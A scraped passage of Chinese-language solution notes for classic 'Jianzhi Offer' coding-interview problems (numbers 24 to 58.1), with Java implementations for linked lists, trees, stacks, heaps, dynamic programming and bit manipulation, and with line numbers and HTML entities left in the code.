= fast.next; &#125; return slow;&#125; 24. 反转链表NowCoder 解题思路递归123456789public ListNode ReverseList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode next = head.next; head.next = null; ListNode newHead = ReverseList(next); next.next = head; return newHead;&#125; 迭代12345678910public ListNode ReverseList(ListNode head) &#123; ListNode newList = new ListNode(-1); while (head != null) &#123; ListNode next = head.next; head.next = newList.next; newList.next = head; head = next; &#125; return newList.next;&#125; 25. 合并两个排序的链表NowCoder 题目描述 解题思路递归1234567891011121314public ListNode Merge(ListNode list1, ListNode list2)&#123; if (list1 == null) return list2; if (list2 == null) return list1; if (list1.val &lt;= list2.val) &#123; list1.next = Merge(list1.next, list2); return list1; &#125; else &#123; list2.next = Merge(list1, list2.next); return list2; &#125;&#125; 迭代1234567891011121314151617181920public ListNode Merge(ListNode list1, ListNode list2)&#123; ListNode head = new ListNode(-1); ListNode cur = head; while (list1 != null &amp;&amp; list2 != null) &#123; if (list1.val &lt;= list2.val) &#123; cur.next = list1; list1 = list1.next; &#125; else &#123; cur.next = list2; list2 = list2.next; &#125; cur = cur.next; &#125; if (list1 != null) cur.next = list1; if (list2 != null) cur.next = list2; return head.next;&#125; 26. 树的子结构NowCoder 题目描述 解题思路1234567891011121314151617public boolean HasSubtree(TreeNode root1, TreeNode root2)&#123; if (root1 == null || root2 == null) return false; return isSubtreeWithRoot(root1, root2) || HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2);&#125;private boolean isSubtreeWithRoot(TreeNode root1, TreeNode root2)&#123; if (root2 == null) return true; if (root1 == null) return false; if (root1.val != root2.val) return false; return isSubtreeWithRoot(root1.left, root2.left) &amp;&amp; isSubtreeWithRoot(root1.right, root2.right);&#125; 27. 二叉树的镜像NowCoder 题目描述 解题思路123456789101112131415public void Mirror(TreeNode root)&#123; if (root == null) return; swap(root); Mirror(root.left); Mirror(root.right);&#125;private void swap(TreeNode root)&#123; TreeNode t = root.left; root.left = root.right; root.right = t;&#125; 28 对称的二叉树NowCder 题目描述 解题思路1234567891011121314151617boolean isSymmetrical(TreeNode pRoot)&#123; if (pRoot == null) return true; return isSymmetrical(pRoot.left, pRoot.right);&#125;boolean isSymmetrical(TreeNode t1, TreeNode t2)&#123; if (t1 == null &amp;&amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetrical(t1.left, t2.right) &amp;&amp; isSymmetrical(t1.right, t2.left);&#125; 29. 顺时针打印矩阵NowCoder 题目描述下图的矩阵顺时针打印结果为：1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10 解题思路12345678910111213141516171819public ArrayList&lt;Integer&gt; printMatrix(int[][] matrix)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); int r1 = 0, r2 = matrix.length - 1, c1 = 0, c2 = matrix[0].length - 1; while (r1 &lt;= r2 &amp;&amp; c1 &lt;= c2) &#123; for (int i = c1; i &lt;= c2; i++) ret.add(matrix[r1][i]); for (int i = r1 + 1; i &lt;= r2; i++) ret.add(matrix[i][c2]); if (r1 != r2) for (int i = c2 - 1; i &gt;= c1; i--) ret.add(matrix[r2][i]); if (c1 != c2) for (int i = r2 - 1; i &gt; r1; i--) ret.add(matrix[i][c1]); r1++; r2--; c1++; c2--; &#125; return ret;&#125; 30. 包含 min 函数的栈NowCoder 题目描述定义栈的数据结构，请在该类型中实现一个能够得到栈最小元素的 min 函数。 解题思路123456789101112131415161718192021222324private Stack&lt;Integer&gt; dataStack = new Stack&lt;&gt;();private Stack&lt;Integer&gt; minStack = new Stack&lt;&gt;();public void push(int node)&#123; dataStack.push(node); minStack.push(minStack.isEmpty() ? node : Math.min(minStack.peek(), node));&#125;public void pop()&#123; dataStack.pop(); minStack.pop();&#125;public int top()&#123; return dataStack.peek();&#125;public int min()&#123; return minStack.peek();&#125; 31. 栈的压入、弹出序列NowCoder 题目描述输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否为该栈的弹出顺序。假设压入栈的所有数字均不相等。例如序列 1,2,3,4,5 是某栈的压入顺序，序列 4,5,3,2,1 是该压栈序列对应的一个弹出序列，但 4,3,5,1,2 就不可能是该压栈序列的弹出序列。 解题思路使用一个栈来模拟压入弹出操作。 12345678910111213public boolean IsPopOrder(int[] pushSequence, int[] popSequence)&#123; int n = pushSequence.length; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); for (int pushIndex = 0, popIndex = 0; pushIndex &lt; n; pushIndex++) &#123; stack.push(pushSequence[pushIndex]); while (popIndex &lt; n &amp;&amp; stack.peek() == popSequence[popIndex]) &#123; stack.pop(); popIndex++; &#125; &#125; return stack.isEmpty();&#125; 32.1 从上往下打印二叉树NowCoder 题目描述从上往下打印出二叉树的每个节点，同层节点从左至右打印。 例如，以下二叉树层次遍历的结果为：1,2,3,4,5,6,7 解题思路使用队列来进行层次遍历。 不需要使用两个队列分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。 123456789101112131415161718public ArrayList&lt;Integer&gt; PrintFromTopToBottom(TreeNode root)&#123; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode t = queue.poll(); if (t == null) continue; ret.add(t.val); queue.add(t.left); queue.add(t.right); &#125; &#125; return ret;&#125; 32.2 把二叉树打印成多行NowCoder 题目描述和上题几乎一样。 解题思路123456789101112131415161718192021ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(pRoot); while (!queue.isEmpty()) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); &#125; if (list.size() != 0) ret.add(list); &#125; return ret;&#125; 32.3 按之字形顺序打印二叉树NowCoder 题目描述请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。 解题思路12345678910111213141516171819202122232425public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(pRoot); boolean reverse = false; while (!queue.isEmpty()) &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int cnt = queue.size(); while (cnt-- &gt; 0) &#123; TreeNode node = queue.poll(); if (node == null) continue; list.add(node.val); queue.add(node.left); queue.add(node.right); &#125; if (reverse) Collections.reverse(list); reverse = !reverse; if (list.size() != 0) ret.add(list); &#125; return ret;&#125; 33. 二叉搜索树的后序遍历序列NowCoder 题目描述输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。假设输入的数组的任意两个数字都互不相同。 例如，下图是后序遍历序列 3,1,2 所对应的二叉搜索树。 解题思路1234567891011121314151617181920public boolean VerifySquenceOfBST(int[] sequence)&#123; if (sequence == null || sequence.length == 0) return false; return verify(sequence, 0, sequence.length - 1);&#125;private boolean verify(int[] sequence, int first, int last)&#123; if (last - first &lt;= 1) return true; int rootVal = sequence[last]; int cutIndex = first; while (cutIndex &lt; last &amp;&amp; sequence[cutIndex] &lt;= rootVal) cutIndex++; for (int i = cutIndex + 1; i &lt; last; i++) if (sequence[i] &lt; rootVal) return false; return verify(sequence, first, cutIndex - 1) &amp;&amp; verify(sequence, cutIndex, last - 1);&#125; 34. 二叉树中和为某一值的路径NowCoder 题目描述输入一颗二叉树和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。 下图的二叉树有两条和为 22 的路径：10, 5, 7 和 10, 12 解题思路12345678910111213141516171819202122private ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root, int target)&#123; backtracking(root, target, new ArrayList&lt;&gt;()); return ret;&#125;private void backtracking(TreeNode node, int target, ArrayList&lt;Integer&gt; path)&#123; if (node == null) return; path.add(node.val); target -= node.val; if (target == 0 &amp;&amp; node.left == null &amp;&amp; node.right == null) &#123; ret.add(new ArrayList&lt;&gt;(path)); &#125; else &#123; backtracking(node.left, target, path); backtracking(node.right, target, path); &#125; path.remove(path.size() - 1);&#125; 35. 复杂链表的复制NowCoder 题目描述输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的 head。 解题思路第一步，在每个节点的后面插入复制的节点。 第二步，对复制节点的 random 链接进行赋值。 第三步，拆分。 123456789101112131415161718192021222324252627282930public RandomListNode Clone(RandomListNode pHead)&#123; if (pHead == null) return null; // 插入新节点 RandomListNode cur = pHead; while (cur != null) &#123; RandomListNode clone = new RandomListNode(cur.label); clone.next = cur.next; cur.next = clone; cur = clone.next; &#125; // 建立 random 链接 cur = pHead; while (cur != null) &#123; RandomListNode clone = cur.next; if (cur.random != null) clone.random = cur.random.next; cur = clone.next; &#125; // 拆分 cur = pHead; RandomListNode pCloneHead = pHead.next; while (cur.next != null) &#123; RandomListNode next = cur.next; cur.next = next.next; cur = next; &#125; return pCloneHead;&#125; 36. 二叉搜索树与双向链表NowCoder 题目描述输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。 解题思路12345678910111213141516171819202122private TreeNode pre = null;private TreeNode head = null;public TreeNode Convert(TreeNode root)&#123; inOrder(root); return head;&#125;private void inOrder(TreeNode node)&#123; if (node == null) return; inOrder(node.left); node.left = pre; if (pre != null) pre.right = node; pre = node; if (head == null) head = node; inOrder(node.right);&#125; 37. 序列化二叉树NowCoder 题目描述请实现两个函数，分别用来序列化和反序列化二叉树。 解题思路123456789101112131415161718192021222324252627282930private String deserializeStr;public String Serialize(TreeNode root)&#123; if (root == null) return "#"; return root.val + " " + Serialize(root.left) + " " + Serialize(root.right);&#125;public TreeNode Deserialize(String str)&#123; deserializeStr = str; return Deserialize();&#125;private TreeNode Deserialize()&#123; if (deserializeStr.length() == 0) return null; int index = deserializeStr.indexOf(" "); String node = index == -1 ? deserializeStr : deserializeStr.substring(0, index); deserializeStr = index == -1 ? "" : deserializeStr.substring(index + 1); if (node.equals("#")) return null; int val = Integer.valueOf(node); TreeNode t = new TreeNode(val); t.left = Deserialize(); t.right = Deserialize(); return t;&#125; 38. 字符串的排列NowCoder 题目描述输入一个字符串，按字典序打印出该字符串中字符的所有排列。例如输入字符串 abc，则打印出由字符 a, b, c 所能排列出来的所有字符串 abc, acb, bac, bca, cab 和 cba。 解题思路123456789101112131415161718192021222324252627282930private ArrayList&lt;String&gt; ret = new ArrayList&lt;&gt;();public ArrayList&lt;String&gt; Permutation(String str)&#123; if (str.length() == 0) return ret; char[] chars = str.toCharArray(); Arrays.sort(chars); backtracking(chars, new boolean[chars.length], new StringBuilder()); return ret;&#125;private void backtracking(char[] chars, boolean[] hasUsed, StringBuilder s)&#123; if (s.length() == chars.length) &#123; ret.add(s.toString()); return; &#125; for (int i = 0; i &lt; chars.length; i++) &#123; if (hasUsed[i]) continue; if (i != 0 &amp;&amp; chars[i] == chars[i - 1] &amp;&amp; !hasUsed[i - 1]) /* 保证不重复 */ continue; hasUsed[i] = true; s.append(chars[i]); backtracking(chars, hasUsed, s); s.deleteCharAt(s.length() - 1); hasUsed[i] = false; &#125;&#125; 39. 数组中出现次数超过一半的数字NowCoder 解题思路多数投票问题，可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。 使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素不相等时，令 cnt–。如果前面查找了 i 个元素，且 cnt == 0 ，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2 ，因为如果多于 i / 2 的话 cnt 就一定不会为 0 。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。 12345678910111213141516public int MoreThanHalfNum_Solution(int[] nums)&#123; int majority = nums[0]; for (int i = 1, cnt = 1; i &lt; nums.length; i++) &#123; cnt = nums[i] == majority ? cnt + 1 : cnt - 1; if (cnt == 0) &#123; majority = nums[i]; cnt = 1; &#125; &#125; int cnt = 0; for (int val : nums) if (val == majority) cnt++; return cnt &gt; nums.length / 2 ? majority : 0;&#125; 40. 最小的 K 个数NowCoder 解题思路快速选择 复杂度：O(N) + O(1) 只有当允许修改数组元素时才可以使用 快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。可以利用这个特性找出数组的第 K 个元素，这种找第 K 个元素的算法称为快速选择算法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (k &gt; nums.length || k &lt;= 0) return ret; findKthSmallest(nums, k - 1); /* findKthSmallest 会改变数组，使得前 k 个数都是最小的 k 个数 */ for (int i = 0; i &lt; k; i++) ret.add(nums[i]); return ret;&#125;public void findKthSmallest(int[] nums, int k)&#123; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int j = partition(nums, l, h); if (j == k) break; if (j &gt; k) h = j - 1; else l = j + 1; &#125;&#125;private int partition(int[] nums, int l, int h)&#123; int p = nums[l]; /* 切分元素 */ int i = l, j = h + 1; while (true) &#123; while (i != h &amp;&amp; nums[++i] &lt; p) ; while (j != l &amp;&amp; nums[--j] &gt; p) ; if (i &gt;= j) break; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125;private void swap(int[] nums, int i, int j)&#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; 大小为 K 的最小堆 复杂度：O(NlogK) + O(K) 特别适合处理海量数据 应该使用大顶堆来维护最小堆，而不能直接创建一个小顶堆并设置一个大小，企图让小顶堆中的元素都是最小元素。 维护一个大小为 K 的最小堆过程如下：在添加一个元素之后，如果大顶堆的大小大于 K，那么需要将大顶堆的堆顶元素去除。 123456789101112public ArrayList&lt;Integer&gt; GetLeastNumbers_Solution(int[] nums, int k)&#123; if (k &gt; nums.length || k &lt;= 0) return new ArrayList&lt;&gt;(); PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1); for (int num : nums) &#123; maxHeap.add(num); if (maxHeap.size() &gt; k) maxHeap.poll(); &#125; return new ArrayList&lt;&gt;(maxHeap) ;&#125; 41.1 数据流中的中位数NowCoder 题目描述如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。 解题思路123456789101112131415161718192021222324252627282930/* 大顶堆，存储左半边元素 */private PriorityQueue&lt;Integer&gt; left = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1);/* 小顶堆，存储右半边元素，并且右半边元素都大于左半边 */private PriorityQueue&lt;Integer&gt; right = new PriorityQueue&lt;&gt;();/* 当前数据流读入的元素个数 */private int N = 0;public void Insert(Integer val)&#123; /* 插入要保证两个堆存于平衡状态 */ if (N % 2 == 0) &#123; /* N 为偶数的情况下插入到右半边。 * 因为右半边元素都要大于左半边，但是新插入的元素不一定比左半边元素来的大， * 因此需要先将元素插入左半边，然后利用左半边为大顶堆的特点，取出堆顶元素即为最大元素，此时插入右半边 */ left.add(val); right.add(left.poll()); &#125; else &#123; right.add(val); left.add(right.poll()); &#125; N++;&#125;public Double GetMedian()&#123; if (N % 2 == 0) return (left.peek() + right.peek()) / 2.0; else return (double) right.peek();&#125; 41.2 字符流中第一个不重复的字符NowCoder 题目描述请实现一个函数用来找出字符流中第一个只出现一次的字符。例如，当从字符流中只读出前两个字符 “go” 时，第一个只出现一次的字符是 “g”。当从该字符流中读出前六个字符“google” 时，第一个只出现一次的字符是 “l”。 解题思路123456789101112131415private int[] cnts = new int[256];private Queue&lt;Character&gt; queue = new LinkedList&lt;&gt;();public void Insert(char ch)&#123; cnts[ch]++; queue.add(ch); while (!queue.isEmpty() &amp;&amp; cnts[queue.peek()] &gt; 1) queue.poll();&#125;public char FirstAppearingOnce()&#123; return queue.isEmpty() ? '#' : queue.peek();&#125; 42. 连续子数组的最大和NowCoder 题目描述{6,-3,-2,7,-15,1,2,2}，连续子数组的最大和为 8（从第 0 个开始，到第 3 个为止）。 解题思路123456789101112public int FindGreatestSumOfSubArray(int[] nums)&#123; if (nums == null || nums.length == 0) return 0; int greatestSum = Integer.MIN_VALUE; int sum = 0; for (int val : nums) &#123; sum = sum &lt;= 0 ? val : sum + val; greatestSum = Math.max(greatestSum, sum); &#125; return greatestSum;&#125; 43. 从 1 到 n 整数中 1 出现的次数NowCoder 解题思路123456789public int NumberOf1Between1AndN_Solution(int n)&#123; int cnt = 0; for (int m = 1; m &lt;= n; m *= 10) &#123; int a = n / m, b = n % m; cnt += (a + 8) / 10 * m + (a % 10 == 1 ? b + 1 : 0); &#125; return cnt;&#125; Leetcode : 233. Number of Digit One-C++JavaPython) 44. 数字序列中的某一位数字题目描述数字以 0123456789101112131415… 的格式序列化到一个字符串中，求这个字符串的第 index 位。 解题思路123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public int getDigitAtIndex(int index)&#123; if (index &lt; 0) return -1; int place = 1; // 位数，1 表示个位，2 表示 十位... while (true) &#123; int amount = getAmountOfPlace(place); int totalAmount = amount * place; if (index &lt; totalAmount) return getDigitAtIndex(index, place); index -= totalAmount; place++; &#125;&#125;/** * place 位数的数字组成的字符串长度 * 10, 90, 900, ... */private int getAmountOfPlace(int place)&#123; if (place == 1) return 10; return (int) Math.pow(10, place - 1) * 9;&#125;/** * place 位数的起始数字 * 0, 10, 100, ... */private int getBeginNumberOfPlace(int place)&#123; if (place == 1) return 0; return (int) Math.pow(10, place - 1);&#125;/** * 在 place 位数组成的字符串中，第 index 个数 */private int getDigitAtIndex(int index, int place)&#123; int beginNumber = getBeginNumberOfPlace(place); int shiftNumber = index / place; String number = (beginNumber + shiftNumber) + ""; int count = index % place; return number.charAt(count) - '0';&#125; 45. 把数组排成最小的数NowCoder 题目描述输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组 {3，32，321}，则打印出这三个数字能排成的最小数字为 321323。 解题思路可以看成是一个排序问题，在比较两个字符串 S1 和 S2 的大小时，应该比较的是 S1+S2 和 S2+S1 的大小，如果 S1+S2 &lt; S2+S1，那么应该把 S1 排在前面，否则应该把 S2 排在前面。 1234567891011121314public String PrintMinNumber(int[] numbers)&#123; if (numbers == null || numbers.length == 0) return ""; int n = numbers.length; String[] nums = new String[n]; for (int i = 0; i &lt; n; i++) nums[i] = numbers[i] + ""; Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1)); String ret = ""; for (String str : nums) ret += str; return ret;&#125; 46. 把数字翻译成字符串Leetcode 题目描述给定一个数字，按照如下规则翻译成字符串：0 翻译成“a”，1 翻译成“b”… 25 翻译成“z”。一个数字有多种翻译可能，例如 12258 一共有 5 种，分别是 bccfi，bwfi，bczi，mcfi，mzi。实现一个函数，用来计算一个数字有多少种不同的翻译方法。 解题思路1234567891011121314151617181920public int numDecodings(String s)&#123; if (s == null || s.length() == 0) return 0; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i &lt;= n; i++) &#123; int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) dp[i] += dp[i - 1]; if (s.charAt(i - 2) == '0') continue; int two = Integer.valueOf(s.substring(i - 2, i)); if (two &lt;= 26) dp[i] += dp[i - 2]; &#125; return dp[n];&#125; 47. 礼物的最大价值NowCoder 题目描述在一个 m*n 的棋盘的每一个格都放有一个礼物，每个礼物都有一定价值（大于 0）。从左上角开始拿礼物，每次向右或向下移动一格，直到右下角结束。给定一个棋盘，求拿到礼物的最大价值。例如，对于如下棋盘 12341 10 3 812 2 9 65 7 4 113 7 16 5 礼物的最大价值为 1+12+5+7+7+16+5=53。 解题思路应该用动态规划求解，而不是深度优先搜索，深度优先搜索过于复杂，不是最优解。 12345678910111213public int getMost(int[][] values)&#123; if (values == null || values.length == 0 || values[0].length == 0) return 0; int n = values[0].length; int[] dp = new int[n]; for (int[] value : values) &#123; dp[0] += value[0]; for (int i = 1; i &lt; n; i++) dp[i] = Math.max(dp[i], dp[i - 1]) + value[i]; &#125; return dp[n - 1];&#125; 48. 最长不含重复字符的子字符串题目描述输入一个字符串（只包含 a~z 的字符），求其最长不含重复字符的子字符串的长度。例如对于 arabcacfr，最长不含重复字符的子字符串为 acfr，长度为 4。 解题思路1234567891011121314151617181920public int longestSubStringWithoutDuplication(String str)&#123; int curLen = 0; int maxLen = 0; int[] preIndexs = new int[26]; Arrays.fill(preIndexs, -1); for (int curI = 0; curI &lt; str.length(); curI++) &#123; int c = str.charAt(curI) - 'a'; int preI = preIndexs[c]; if (preI == -1 || curI - preI &gt; curLen) &#123; curLen++; &#125; else &#123; maxLen = Math.max(maxLen, curLen); curLen = curI - preI; &#125; preIndexs[c] = curI; &#125; maxLen = Math.max(maxLen, curLen); return maxLen;&#125; 49. 丑数NowCoder 题目描述把只包含因子 2、3 和 5 的数称作丑数（Ugly Number）。例如 6、8 都是丑数，但 14 不是，因为它包含因子 7。习惯上我们把 1 当做是第一个丑数。求按从小到大的顺序的第 N 个丑数。 解题思路12345678910111213141516171819public int GetUglyNumber_Solution(int N)&#123; if (N &lt;= 6) return N; int i2 = 0, i3 = 0, i5 = 0; int[] dp = new int[N]; dp[0] = 1; for (int i = 1; i &lt; N; i++) &#123; int next2 = dp[i2] * 2, next3 = dp[i3] * 3, next5 = dp[i5] * 5; dp[i] = Math.min(next2, Math.min(next3, next5)); if (dp[i] == next2) i2++; if (dp[i] == next3) i3++; if (dp[i] == next5) i5++; &#125; return dp[N - 1];&#125; 50. 第一个只出现一次的字符位置NowCoder 题目描述在一个字符串 (1 &lt;= 字符串长度 &lt;= 10000，全部由字母组成) 中找到第一个只出现一次的字符，并返回它的位置。 解题思路最直观的解法是使用 HashMap 对出现次数进行统计，但是考虑到要统计的字符范围有限，因此可以使用整型数组代替 HashMap。 12345678910public int FirstNotRepeatingChar(String str)&#123; int[] cnts = new int[256]; for (int i = 0; i &lt; str.length(); i++) cnts[str.charAt(i)]++; for (int i = 0; i &lt; str.length(); i++) if (cnts[str.charAt(i)] == 1) return i; return -1;&#125; 以上实现的空间复杂度还不是最优的。考虑到只需要找到只出现一次的字符，那么我们只需要统计的次数信息只有 0,1,更大，使用两个比特位就能存储这些信息。 1234567891011121314151617public int FirstNotRepeatingChar2(String str)&#123; BitSet bs1 = new BitSet(256); BitSet bs2 = new BitSet(256); for (char c : str.toCharArray()) &#123; if (!bs1.get(c) &amp;&amp; !bs2.get(c)) bs1.set(c); // 0 0 -&gt; 0 1 else if (bs1.get(c) &amp;&amp; !bs2.get(c)) bs2.set(c); // 0 1 -&gt; 1 1 &#125; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str.charAt(i); if (bs1.get(c) &amp;&amp; !bs2.get(c)) // 0 1 return i; &#125; return -1;&#125; 51. 数组中的逆序对NowCoder 题目描述在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数 P。 解题思路123456789101112131415161718192021222324252627282930313233343536373839private long cnt = 0;private int[] tmp; // 在这里创建辅助数组，而不是在 merge() 递归函数中创建public int InversePairs(int[] nums)&#123; tmp = new int[nums.length]; mergeSort(nums, 0, nums.length - 1); return (int) (cnt % 1000000007);&#125;private void mergeSort(int[] nums, int l, int h)&#123; if (h - l &lt; 1) return; int m = l + (h - l) / 2; mergeSort(nums, l, m); mergeSort(nums, m + 1, h); merge(nums, l, m, h);&#125;private void merge(int[] nums, int l, int m, int h)&#123; int i = l, j = m + 1, k = l; while (i &lt;= m || j &lt;= h) &#123; if (i &gt; m) tmp[k] = nums[j++]; else if (j &gt; h) tmp[k] = nums[i++]; else if (nums[i] &lt; nums[j]) tmp[k] = nums[i++]; else &#123; tmp[k] = nums[j++]; this.cnt += m - i + 1; // nums[i] &gt;= nums[j]，说明 nums[i...mid] 都大于 nums[j] &#125; k++; &#125; for (k = l; k &lt;= h; k++) nums[k] = tmp[k];&#125; 52. 两个链表的第一个公共结点NowCoder 题目描述 解题思路设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。 当访问 A 链表的指针访问到链表尾部时，令它从链表 B 的头部重新开始访问链表 B；同样地，当访问 B 链表的指针访问到链表尾部时，令它从链表 A 的头部重新开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。 123456789public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2)&#123; ListNode l1 = pHead1, l2 = pHead2; while (l1 != l2) &#123; l1 = (l1 == null) ? pHead2 : l1.next; l2 = (l2 == null) ? pHead1 : l2.next; &#125; return l1;&#125; 53 数字在排序数组中出现的次数NowCoder 题目描述12345Input:1, 2, 3, 3, 3, 3, 4, 63Output:4 解题思路12345678910111213141516171819public int GetNumberOfK(int[] nums, int K)&#123; int first = binarySearch(nums, K); int last = binarySearch(nums, K + 1); return (first == nums.length || nums[first] != K) ? 0 : last - first;&#125;private int binarySearch(int[] nums, int K)&#123; int l = 0, h = nums.length; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= K) h = m; else l = m + 1; &#125; return l;&#125; 54. 二叉搜索树的第 K 个结点NowCoder 解题思路利用二叉搜索数中序遍历有序的特点。 12345678910111213141516171819private TreeNode ret;private int cnt = 0;public TreeNode KthNode(TreeNode pRoot, int k)&#123; inOrder(pRoot, k); return ret;&#125;private void inOrder(TreeNode root, int k)&#123; if (root == null || cnt &gt;= k) return; inOrder(root.left, k); cnt++; if (cnt == k) ret = root; inOrder(root.right, k);&#125; 55.1 二叉树的深度NowCoder 题目描述从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。 解题思路1234public int TreeDepth(TreeNode root)&#123; return root == null ? 0 : 1 + Math.max(TreeDepth(root.left), TreeDepth(root.right));&#125; 55.2 平衡二叉树NowCoder 题目描述平衡二叉树左右子树高度差不超过 1。 解题思路123456789101112131415161718private boolean isBalanced = true;public boolean IsBalanced_Solution(TreeNode root)&#123; height(root); return isBalanced;&#125;private int height(TreeNode root)&#123; if (root == null || !isBalanced) return 0; int left = height(root.left); int right = height(root.right); if (Math.abs(left - right) &gt; 1) isBalanced = false; return 1 + Math.max(left, right);&#125; 56. 数组中只出现一次的数字NowCoder 题目描述一个整型数组里除了两个数字之外，其他的数字都出现了两次，找出这两个数。 解题思路两个不相等的元素在位级表示上必定会有一位存在不同，将数组的所有元素异或得到的结果为不存在重复的两个元素异或的结果。 diff &amp;= -diff 得到出 diff 最右侧不为 0 的位，也就是不存在重复的两个元素在位级表示上最右侧不同的那一位，利用这一位就可以将两个元素区分开来。 12345678910111213public void FindNumsAppearOnce(int[] nums, int num1[], int num2[])&#123; int diff = 0; for (int num : nums) diff ^= num; diff &amp;= -diff; for (int num : nums) &#123; if ((num &amp; diff) == 0) num1[0] ^= num; else num2[0] ^= num; &#125;&#125; 57.1 和为 S 的两个数字NowCoder 题目描述输入一个递增排序的数组和一个数字 S，在数组中查找两个数，使得他们的和正好是 S，如果有多对数字的和等于 S，输出两个数的乘积最小的。 解题思路使用双指针，一个指针指向元素较小的值，一个指针指向元素较大的值。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。 如果两个指针指向元素的和 sum == target，那么得到要求的结果； 如果 sum &gt; target，移动较大的元素，使 sum 变小一些； 如果 sum &lt; target，移动较小的元素，使 sum 变大一些。 1234567891011121314public ArrayList&lt;Integer&gt; FindNumbersWithSum(int[] array, int sum)&#123; int i = 0, j = array.length - 1; while (i &lt; j) &#123; int cur = array[i] + array[j]; if (cur == sum) return new ArrayList&lt;&gt;(Arrays.asList(array[i], array[j])); if (cur &lt; sum) i++; else j--; &#125; return new ArrayList&lt;&gt;();&#125; 57.2 和为 S 的连续正数序列NowCoder 题目描述输出所有和为 S 的连续正数序列。 例如和为 100 的连续序列有： 12[9, 10, 11, 12, 13, 14, 15, 16][18, 19, 20, 21, 22]。 解题思路12345678910111213141516171819202122232425public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindContinuousSequence(int sum)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); int start = 1, end = 2; int curSum = 3; while (end &lt; sum) &#123; if (curSum &gt; sum) &#123; curSum -= start; start++; &#125; else if (curSum &lt; sum) &#123; end++; curSum += end; &#125; else &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = start; i &lt;= end; i++) list.add(i); ret.add(list); curSum -= start; start++; end++; curSum += end; &#125; &#125; return ret;&#125; 58.1 翻转单词顺序列NowCoder 